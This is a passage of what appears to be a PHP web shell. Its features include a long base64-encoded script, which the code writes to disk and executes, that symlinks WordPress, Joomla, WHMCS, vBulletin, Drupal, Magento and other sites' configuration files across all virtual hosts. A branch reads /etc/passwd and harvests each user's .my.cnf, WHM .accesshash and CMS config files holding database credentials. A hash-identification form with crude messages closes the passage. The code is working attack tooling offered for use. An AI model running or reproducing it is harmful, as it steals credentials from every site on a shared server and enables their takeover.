nL2h0dHBkb2NzL3Byb3RhbC93cC1jb25maWcucGhwJywkc2l0ZXNzLictV29yZHByZXNzLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3Mtc2l0ZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYWluL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtbWFpbi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy90ZXN0L3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy1Xb3JkcHJlc3MtdGVzdC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hcmNhZGUvZnVuY3Rpb25zL2RiY2xhc3MucGhwJywkc2l0ZXNzLictaWJwcm9hcmNhZGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJjYWRlL2Z1bmN0aW9ucy9kYmNsYXNzLnBocCcsJHNpdGVzcy4nLWlicHJvYXJjYWRlLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYTIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9qb28vY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb28udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLWNtcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXNpdGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYS1tYWluLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ld3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbmV3cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtbmV3LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEtaG9tZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy92Yi9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmJ+Y29uZmlnLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmIzfmNvbmZpZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jYy9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdmIxfmNvbmZpZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9mb3J1bS9pbmNsdWRlcy9jbGFzc19jb3JlLnBocCcsJHNpdGVzcy4nLXZibHV0dGlufmNsYXNzX2NvcmUucGhwLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3ZiL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAxLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NjL2luY2x1ZGVzL2NsYXNzX2NvcmUucGhwJywkc2l0ZXNzLictdmJsdXR0aW5+Y2xhc3NfY29yZS5waHAyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobTE1LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NlbnRyYWwvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tY2VudHJhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy93aG0vd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0td2htY3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htL1dITUNTL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLVdITUNTLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobWMvV0hNL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htYy1XSE0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG1jcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcG9ydC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VwcC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zZWN1cmUvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1zdWN1cmUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1Y3VyZS13aG0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2VjdXJlL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictc3VjdXJlLXdobWNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWNwYW5lbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXBhbmVsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictaG9zdHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb29tbGEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VibWl0dGlja2V0LnBocCcsJHNpdGVzcy4nLXdobWNzMi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jbGllbnRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictY2xpZW50LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1jbGllbnRzdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1iaWxsaW5nLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy13aG0tbWFuYWdlLnR4dCcpOyANCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9teS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS1teS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvbXlzaG9wL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictd2htLW15c2hvcC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictemVuY2FydC50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRzaXRlc3MuJy1zaG9wLXplbmNhcnQudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkc2l0ZXNzLictc2hvcC1aQ3Nob3AudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc21mL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZjIudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2ZvcnVtL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bS50eHQnKTsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW1zL1NldHRpbmdzLnBocCcsJHNpdGVzcy4nLXNtZi1mb3J1bXMudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictdXAudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJ0aWNsZS9jb25maWcucGhwJywkc2l0ZXNzLictTndhaHkudHh0Jyk7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3VwL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy11cDIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZl9nbG9iYWwucGhwJywkc2l0ZXNzLictNi50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9pbmNsdWRlL2RiLnBocCcsJHNpdGVzcy4nLTcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29ubmVjdC5waHAnLCRzaXRlc3MuJy1QSFAtRnVzaW9uLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL21rX2NvbmYucGhwJywkc2l0ZXNzLictOS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcucGhwJywkc2l0ZXNzLictNGltYWdlcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCcsJHNpdGVzcy4nLURydXBhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9tZW1iZXIvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy0xbWVtYmVyLnR4dCcpIDsgDQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmlsbGluZ3MvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1iaWxsaW5ncy50eHQnKSA7IA0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dobS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXdobS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zdXBwb3J0cy9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLXN1cHBvcnRzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3JlcXVpcmVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy1BTTRTUy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3N1cHBvcnRzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLXN1cHBvcnRzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NsaWVudC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1jbGllbnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc3VwcG9ydC9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1zdXBwb3J0LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2JpbGxpbmcvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtYmlsbGluZy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iaWxsaW5ncy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1iaWxsaW5ncy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ob3N0L2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3QudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdHMvaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdHMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9zdGluZy9pbmNsdWRlcy9pc280MjE3LnBocCcsJHNpdGVzcy4nLWhvc3RiaWxscy1ob3N0aW5nLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RpbmdzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RpbmdzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2hvc3RiaWxsaW5jbHVkZXMvaXNvNDIxNy5waHAnLCRzaXRlc3MuJy1ob3N0YmlsbHMtaG9zdGJpbGxzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2luY2x1ZGVzL2lzbzQyMTcucGhwJywkc2l0ZXNzLictaG9zdGJpbGxzLWhvc3RiaWxsLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FwcC9ldGMvbG9jYWwueG1sJywkc2l0ZXNzLictTWFnZW50by50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hZG1pbi9jb25maWcucGhwJywkc2l0ZXNzLictT3BlbmNhcnQudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY29uZmlnL3NldHRpbmdzLmluYy5waHAnLCRzaXRlc3MuJy1QcmVzdGFzaG9wLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NvbmZpZy9rb25la3NpLnBocCcsJHNpdGVzcy4nLUxva29tZWRpYS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9sb2tvbWVkaWEvY29uZmlnL2tvbmVrc2kucGhwJywkc2l0ZXNzLictTG9rb21lZGlhLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3NsY29uZmlnLnBocCcsJHNpdGVzcy4nLVNpdGVsb2NrLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FwcGxpY2F0aW9uL2NvbmZpZy9kYXRhYmFzZS5waHAnLCRzaXRlc3MuJy1FbGxpc2xhYi50eHQnKTsNCn0NCnByaW50ICJMb2NhdGlvbjogLi9cblxuIjs=";
        $file = "lonte_config/vhost.cin";
        $handle = fopen($file ,"w+");
        fwrite($handle ,base64_decode($vhost));
        fclose($handle);
        chmod($file, 0755);
        if(exe("cd lonte_config && ./vhost.cin")) {
            echo "<center><a href=/lonte_config'><font color=lime>Done</font></a></center>";
        } else {
            echo "<center><a href='/lonte_configvhost.cin'><font color=lime>Done</font></a></center>";
        }

    } else {
        $etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
        while($passwd = fgets($etc)) {
            if($passwd == "" || !$etc) {
                echo "<font color=red>Can't read /etc/passwd</font>";
            } else {
                preg_match_all('/(.*?):x:/', $passwd, $user_config);
                foreach($user_config[1] as $user_idx) {
                    $user_config_dir = "/home/$user_idx/public_html/";
                    if(is_readable($user_config_dir)) {
                        $grab_config = array(
                            "/home/$user_idx/.my.cnf" => "cpanel",
                            "/home/$user_idx/.accesshash" => "WHM-accesshash",
                            "$user_config_dir/po-content/config.php" => "Popoji",
                            "$user_config_dir/vdo_config.php" => "Voodoo",
                            "$user_config_dir/bw-configs/config.ini" => "BosWeb",
                            "$user_config_dir/config/koneksi.php" => "Lokomedia",
                            "$user_config_dir/lokomedia/config/koneksi.php" => "Lokomedia",
                            "$user_config_dir/clientarea/configuration.php" => "WHMCS",
                            "$user_config_dir/whm/configuration.php" => "WHMCS",
                            "$user_config_dir/whmcs/configuration.php" => "WHMCS",
                            "$user_config_dir/forum/config.php" => "phpBB",
                            "$user_config_dir/sites/default/settings.php" => "Drupal",
                            "$user_config_dir/config/settings.inc.php" => "PrestaShop",
                            "$user_config_dir/app/etc/local.xml" => "Magento",
                            "$user_config_dir/joomla/configuration.php" => "Joomla",
                            "$user_config_dir/configuration.php" => "Joomla",
                            "$user_config_dir/wp/wp-config.php" => "WordPress",
                            "$user_config_dir/wordpress/wp-config.php" => "WordPress",
                            "$user_config_dir/wp-config.php" => "WordPress",
                            "$user_config_dir/admin/config.php" => "OpenCart",
                            "$user_config_dir/slconfig.php" => "Sitelok",
                            "$user_config_dir/application/config/database.php" => "Ellislab");
                        foreach($grab_config as $config => $nama_config) {
                            $ambil_config = file_get_contents($config);
                            if($ambil_config == '') {
                            } else {
                                $file_config = fopen("idx_config/$user_idx-$nama_config.txt","w");
                                fputs($file_config,$ambil_config);
                            }
                        }
                    }       
                }
            }   
        }
    echo "<center><a href='?'><font color=lime>Done</font></a></center>";
    }
}
if(isset($_GET['tool']) && ($_GET['tool'] == 'hashid')) {
if(isset($_POST['gethash'])){
        $hash = $_POST['hash'];
        if(strlen($hash)==32){
            $hashresult = "Ini Hash Mode MD5";
        }elseif(strlen($hash)==40){
            $hashresult = "SHA-1 Hash/ /MySQL5 Hash";
        }elseif(strlen($hash)==13){
            $hashresult = "DES(Unix) Hash";
        }elseif(strlen($hash)==16){
            $hashresult = "MySQL Hash / /DES(Oracle Hash)";
        }elseif(strlen($hash)==41){
            $GetHashChar = substr($hash, 40);
            if($GetHashChar == "*"){
                $hashresult = "MySQL5 Hash"; 
            }   
        }elseif(strlen($hash)==64){
            $hashresult = "SHA-256 Hash";
        }elseif(strlen($hash)==96){
            $hashresult = "SHA-384 Hash";
        }elseif(strlen($hash)==128){
            $hashresult = "SHA-512 Hash";
        }elseif(strlen($hash)==34){
            if(strstr($hash, '$1$')){
                $hashresult = "MD5(Unix) Hash";
            }   
        }elseif(strlen($hash)==37){
            if(strstr($hash, '$apr1$')){
                $hashresult = "MD5(APR) Hash";
            }   
        }elseif(strlen($hash)==34){
            if(strstr($hash, '$H$')){
                $hashresult = "MD5(phpBB3) Hash";
            }   
        }elseif(strlen($hash)==34){
            if(strstr($hash, '$P$')){
                $hashresult = "MD5(Wordpress) Hash";
            }   
        }elseif(strlen($hash)==39){
            if(strstr($hash, '$5$')){
                $hashresult = "SHA-256(Unix) Hash";
            }   
        }elseif(strlen($hash)==39){
            if(strstr($hash, '$6$')){
                $hashresult = "SHA-512(Unix) Hash";
            }   
        }elseif(strlen($hash)==24){
            if(strstr($hash, '==')){
                $hashresult = "MD5(Base-64) Hash";
            }   
        }else{
            $hashresult = "Ini hash mode appan anjenk??";
        }
    }else{
        $hashresult = "Isi dulu hash nya tolo -_-";
    }
    
    ?>
    <center><br><Br><br>
    
        <form action="" method="POST">
        <tr>
        <table class="tabnet">
        <th colspan="5">Hash Identification</th>
        <tr class="optionstr"><B><td>Enter Hash</td></b><td>:</td>  <td><input type="text" name="hash" size='60' class="inputz" /></td><td><input type="submit" class="inputzbut" name="gethash" value="Identify Hash" /></td></tr>
        <tr class="optionstr"><b><td>Result</td><td>:</td><td><?php echo $hashresult; ?></td></tr></b>
    </table></tr></form>
    </center>
    
    <?php
 }
?>
